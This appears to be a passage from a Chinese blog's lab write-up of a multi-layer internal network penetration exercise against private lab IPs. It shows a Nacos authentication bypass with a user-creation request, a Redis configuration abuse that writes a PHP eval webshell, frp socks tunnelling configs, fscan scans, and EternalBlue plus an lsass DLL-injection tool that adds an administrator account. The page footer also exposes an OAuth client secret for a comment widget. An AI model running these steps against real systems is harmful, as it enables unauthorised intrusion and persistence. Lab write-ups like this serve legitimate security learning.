+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用burp抓包发现版本号，搜索一下有没有相关漏洞，我想，既然<span class="number">2.0</span>.<span class="number">3</span>有身份绕过漏洞，<span class="number">2.0</span>.<span class="number">1</span>应该也有吧，</span><br><span class="line">https:<span class="regexp">//m</span>p.weixin.qq.com<span class="regexp">/s/</span>PtyJDLqyFiiVDOZkttO1bA</span><br><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">5.129</span>:<span class="number">8848</span><span class="regexp">/nacos/</span>v1<span class="regexp">/auth/u</span>sers?pageNo=<span class="number">1</span>&amp;pageSize=<span class="number">100</span> 能看到所有用户名账号密码(加密的)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219094038490.png" alt="image-20241219094038490"></p>
+<p>​	</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">创建一个用户</span><br><span class="line"></span><br><span class="line">POST /nacos/v1/auth/users HTTP/1.1</span><br><span class="line">Host: 192.168.5.129:8848</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line"></span><br><span class="line">username=shell&amp;password=shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219094924200.png" alt="image-20241219094924200"></p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们登录后台之后发现了一个密码，还有<span class="built_in">flag</span> ，这个密码可能是</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219095039205.png" alt="image-20241219095039205"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">继续回去看fscan内容发现有22号端口,连接拒绝,那么这个密码肯定不是ssh的密码了,难道还有其他服务,我没有发现</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219102109791.png" alt="image-20241219102109791"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">重新做了信息收集,发现还有redis服务6379端口</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219102320191.png" alt="image-20241219102320191"></p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4 redis-cli -h <span class="number">192</span>.<span class="number">168</span>.<span class="number">5</span>.<span class="number">129</span></span><br><span class="line"><span class="string">[proxychains]</span> config file found: /etc/proxychains4.conf</span><br><span class="line"><span class="string">[proxychains]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.<span class="number">4</span></span><br><span class="line"><span class="string">[proxychains]</span> DLL init: proxychains-ng <span class="number">4</span>.<span class="number">17</span></span><br><span class="line"><span class="string">[proxychains]</span> Strict chain  ...  <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">240</span>:<span class="number">6000</span>  ...  <span class="number">192</span>.<span class="number">168</span>.<span class="number">5</span>.<span class="number">129</span>:<span class="number">6379</span>  ...  OK</span><br><span class="line"><span class="number">192.168.5.129:6379</span>&gt; auth P@ssw0rd_sec</span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168.5.129:6379</span>&gt; info</span><br><span class="line"># Server</span><br><span class="line">redis_version:<span class="number">4</span>.<span class="number">0</span>.<span class="number">9</span></span><br><span class="line">redis_git_sha1:<span class="number">00000000</span></span><br><span class="line">redis_git_dirty:<span class="number">0</span></span><br><span class="line">redis_build_id:716f5ce027619146</span><br><span class="line">redis_mode:standalone</span><br><span class="line">os:Linux <span class="number">5</span>.<span class="number">15</span>.<span class="number">0</span>-<span class="number">125</span>-generic x86_64</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219102909038.png" alt="image-20241219102909038"></p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">写入shell</span><br><span class="line"><span class="number">192.168.5.129:6379</span>&gt; config set dir /var/www/html     这个是前面获取的绝对路径</span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168.5.129:6379</span>&gt; config set dbfilename shell.php   在绝对路径下写入shell.php</span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168.5.129:6379</span>&gt; set x <span class="string">&quot;\r\n\r\n&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot;</span>   shell.php的一句话木马</span><br><span class="line">OK</span><br><span class="line"><span class="number">192.168.5.129:6379</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219103026036.png" alt="image-20241219103026036"></p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">现在在proxifier加上蚁剑的程序,我发现不需要,我设置的任意程序连接这个<span class="built_in">ip</span>都走代理</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219103259019.png" alt="image-20241219103259019"></p>
+<p>​	<img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219103207039.png"></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">现在就拿到了二层内网的<span class="keyword">shell</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219103414737.png" alt="image-20241219103414737"></p>
+<h1 id="3-三层内网渗透"><a href="#3-三层内网渗透" class="headerlink" title="3.三层内网渗透"></a>3.三层内网渗透</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">对于DMZ设备:传入frps<span class="selector-class">.exe</span> frps<span class="selector-class">.toml</span></span><br><span class="line">bindPort = <span class="number">7000</span></span><br><span class="line">输入命令frps<span class="selector-class">.exe</span> -c frps.toml</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">对于二层设备:传入frpc.exe frpc.toml</span></span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.5.128  <span class="comment">#这个是二层设备的ip</span></span><br><span class="line">server_port = 7000           <span class="comment">#这个是二层设备一会传入frps.toml开的port</span></span><br><span class="line"></span><br><span class="line">[plugin_socks]</span><br><span class="line">name = <span class="string">&quot;frp&quot;</span></span><br><span class="line"><span class="comment"># type = &quot;tcp&quot;</span></span><br><span class="line">type = tcp</span><br><span class="line"><span class="comment"># localIP = &quot;127.0.0.1&quot;</span></span><br><span class="line">localPort = 22</span><br><span class="line">remote_port = 22  <span class="comment">#把本地的22号端口给到二层设备的22端口,同时二层设备的22端口给到了攻击机的6000端口,这样攻击机的6000端口就能和两个网段通信</span></span><br><span class="line">plugin = socks5</span><br><span class="line"></span><br><span class="line">输入命令frpc.exe -c frpc.toml</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在之前我们把DMZ的22端口给到了攻击机的6000端口</span><br><span class="line">现在我们把二层设备的22端口给到DMZ的22端口</span><br><span class="line">也就是说我们攻击机的22端口连这二层设备的22端口，以及DMZ的22端口</span><br><span class="line"><span class="section">攻击机:6000==DMZ:22==二层内网:22</span></span><br><span class="line"><span class="section">DMZ:22-&gt;攻击机:6000</span></span><br><span class="line"><span class="section">二层内网:22-&gt;攻击机:6000</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219105946843.png" alt="image-20241219105946843"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">改一下代理规则</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219110031758.png" alt="image-20241219110031758"></p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">在二层先扫一下三层设备吧,用fscan32  传上去之后还是得先+x权限</span><br><span class="line">(www-data:/var/www/html) $ fscan -h 192.168.6.128-254</span><br><span class="line">/bin/sh: 1: fscan: not found</span><br><span class="line">(www-data:/var/www/html) $ chmod +x fscan32</span><br><span class="line">(www-data:/var/www/html) $ fscan32 -h 192.168.6.128-254</span><br><span class="line">(www-data:/var/www/html) $ fscan32 -h 192.168.6.131 &gt;1.txt</span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___|<span class="string"> </span>|<span class="string"> __ </span></span><br><span class="line"><span class="string"> / /_\/____/ __</span>|<span class="string">/ __</span>|<span class="string"> &#x27;__/ _` </span>|<span class="string">/ __</span>|<span class="string"> </span>|<span class="string">/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> (_</span>|<span class="string"> </span>|<span class="string"> (__</span>|<span class="string">   &lt;    </span></span><br><span class="line"><span class="string">\____/     </span>|<span class="string">___/\___</span>|<span class="string">_</span>|<span class="string">  \__,_</span>|<span class="string">\___</span>|<span class="string">_</span>|<span class="string">\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.3</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219110504174.png" alt="image-20241219110504174"></p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">有永恒之蓝,直接用msf打</span><br><span class="line"><span class="variable">$ </span>proxychains4 msfconsole</span><br><span class="line">msf6 &gt; search ms17-<span class="number">0</span>10</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219111504738.png" alt="image-20241219111504738"></p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="keyword">set</span> rhosts <span class="comment">192.168.6.131</span></span><br><span class="line">msf6 <span class="comment">exploit(windows</span>/smb/<span class="comment">ms17_010_eternalblue) &gt; run</span></span><br><span class="line">一直失败,忽然想起来我这个是正向代理,但是shell是交互式的,kali通过正向代理能够和三层机器通信,三层内网机器找不到kali</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">思考之后感觉应该加个反向代理可以</span><br><span class="line">攻击机<span class="number">6001</span>-&gt;DMZ:<span class="number">6002</span></span><br><span class="line">DMZ:<span class="number">6002</span>-&gt;二层:<span class="number">6002</span></span><br><span class="line">那么我用msf攻击并且监听本地的<span class="number">6001</span>端口,</span><br><span class="line">思来想去有点不太行,我的网络架构还有点复杂,我用的kali是wsl桥接的Windows10,还得再做一个正向代理接到Windows10和kali</span><br><span class="line">反正就是我能到三层内网设备,但是三层内网设备到不了我机器</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在网上找了abc_123师傅的工具能直接打,加代理链就行,同时代理规则要用这个代理链</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219142612106.png" alt="image-20241219142612106"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219142639012.png" alt="image-20241219142639012"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219142719461.png" alt="image-20241219142719461"></p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用lsass.exe然后先漏洞利用接着注入dll文件,会自动创建一个管理员账号admi<span class="symbol">n01</span>的密码为Co<span class="symbol">nfig123</span>!@<span class="attr">#</span></span><br><span class="line"><span class="attr">开了3389</span>端口,用RDP协议连</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01//image-20241219143232459.png" alt="image-20241219143232459"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最后的最后,拿出我们最拿手的CobaltStrike</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"># 内网渗透</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="../%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%B8%89%E5%B1%82%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A02/">内网渗透-三层网络渗透学习2</a>
+            
+            
+            <a class="next" rel="next" href="../%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86/">内网渗透-Linux提权梳理</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
